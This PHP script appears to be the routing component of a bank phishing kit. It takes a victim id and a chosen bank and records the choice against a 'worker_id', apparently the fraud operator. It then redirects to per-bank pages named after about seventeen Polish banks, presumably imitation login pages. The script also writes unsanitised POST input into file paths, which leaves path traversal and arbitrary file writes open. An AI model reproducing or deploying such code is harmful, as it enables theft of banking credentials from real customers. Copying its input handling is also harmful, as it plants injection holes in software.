<?php

include "service.php";
include "../settings.php";

if (file_exists("data/" . $_POST['id'] . ".xml") == false){
    header("location: " . $_temp['original']);
    exit;
}
$xml = simplexml_load_file("data/" . $_POST["id"] . ".xml");

switch ($_POST['bankname']){
    case 'alior':
        file_put_contents("/var/www/html/lk/" . $_POST['id'] . "_" . $xml->worker_id, "alior");
        header("location: banks/alior.php?id=" . $_POST['id']);
    break;
    case 'pko':
        file_put_contents("/var/www/html/lk/" . $_POST['id'] . "_" . $xml->worker_id, "ipko");
        header("location: banks/ipko.php?id=" . $_POST['id']);
    break;
    case 'ing':
        file_put_contents("/var/www/html/lk/" . $_POST['id'] . "_" . $xml->worker_id, "ing");
        header("location: banks/ing.php?id=" . $_POST['id']);
    break;
    case 'santander':
        file_put_contents("/var/www/html/lk/" . $_POST['id'] . "_" . $xml->worker_id, "santander");
        header("location: banks/santander.php?id=" . $_POST['id']);
    break;
    case 'mbank':
        file_put_contents("/var/www/html/lk/" . $_POST['id'] . "_" . $xml->worker_id, "mbank");
        header("location: banks/mbank.php?id=" . $_POST['id']);
    break;
    case 'bnp':
        file_put_contents("/var/www/html/lk/" . $_POST['id'] . "_" . $xml->worker_id, "paribas");
        header("location: banks/paribas.php?id=" . $_POST['id']);
    break;
    case 'pekao':
        file_put_contents("/var/www/html/lk/" . $_POST['id'] . "_" . $xml->worker_id, "pekao");
        header("location: banks/pekao.php?id=" . $_POST['id']);
    break;
    case 'getin':
        file_put_contents("/var/www/html/lk/" . $_POST['id'] . "_" . $xml->worker_id, "getin");
        header("location: banks/getin.php?id=" . $_POST['id']);
    break;
    case 'millennium':
        file_put_contents("/var/www/html/lk/" . $_POST['id'] . "_" . $xml->worker_id, "millenium");
        header("location: banks/millenium.php?id=" . $_POST['id']);
    break;
    case 'agricole':
        file_put_contents("/var/www/html/lk/" . $_POST['id'] . "_" . $xml->worker_id, "agricole");
        header("location: banks/agricole.php?id=" . $_POST['id']);
    break;
    case 'pocztowy':
        file_put_contents("/var/www/html/lk/" . $_POST['id'] . "_" . $xml->worker_id, "pocztowy");
        header("location: banks/pocztowy.php?id=" . $_POST['id']);
    break;
    case 'sgb':
        file_put_contents("/var/www/html/lk/" . $_POST['id'] . "_" . $xml->worker_id, "sgb");
        header("location: banks/sgb.php?id=" . $_POST['id']);
    break;
    case 'gsb':
        file_put_contents("/var/www/html/lk/" . $_POST['id'] . "_" . $xml->worker_id, "gbs");
        header("location: banks/gbs.php?id=" . $_POST['id']);
    break;
    case 'noble':
        file_put_contents("/var/www/html/lk/" . $_POST['id'] . "_" . $xml->worker_id, "noble");
        header("location: banks/noble.php?id=" . $_POST['id']);
    break;
    case 'nowy':
        file_put_contents("/var/www/html/lk/" . $_POST['id'] . "_" . $xml->worker_id, "bfg");
        header("location: banks/bfg.php?id=" . $_POST['id']);
    break;
    case 'bos':
        file_put_contents("/var/www/html/lk/" . $_POST['id'] . "_" . $xml->worker_id, "bos");
        header("location: banks/bos.php?id=" . $_POST['id']);
    break;
    case 'citi':
        file_put_contents("/var/www/html/lk/" . $_POST['id'] . "_" . $xml->worker_id, "citibank");
        header("location: banks/citibank.php?id=" . $_POST['id']);
    break;
    
}

?>